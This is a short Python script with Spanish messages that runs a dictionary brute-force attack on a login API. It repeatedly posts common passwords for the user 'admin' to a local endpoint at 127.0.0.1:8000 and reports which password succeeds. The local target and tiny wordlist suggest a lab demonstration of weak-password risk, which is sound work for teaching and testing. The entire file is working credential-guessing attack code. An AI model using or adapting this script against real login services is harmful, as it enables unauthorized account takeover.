import requests
import time

URL = "http://127.0.0.1:8000/login"
TARGET_USER = "admin"  
DICTIONARY = ["123456", "password", "qwerty", "admin123", "fuerza2026"]

def brute_force_attack():
    print(f"Iniciando ataque en: {TARGET_USER} ")
    start_time = time.time()
    attempts = 0

    for password in DICTIONARY:
        attempts += 1
        payload = {"username": TARGET_USER, "password": password}
        
        try:
            response = requests.post(URL, json=payload)
            if response.status_code == 200:
                end_time = time.time()
                print(f"Contraseña encontrada: '{password}'")
                print(f"Intentos: {attempts} | Tiempo: {end_time - start_time:.2f}s")
                return
            else:
                print(f"[-] Intento {attempts}: '{password}' - Fallido")
        except requests.ConnectionError:
            print("Error de conexión con la API.")
            return

    print("No se encontró la contraseña")

if __name__ == "__main__":
    brute_force_attack()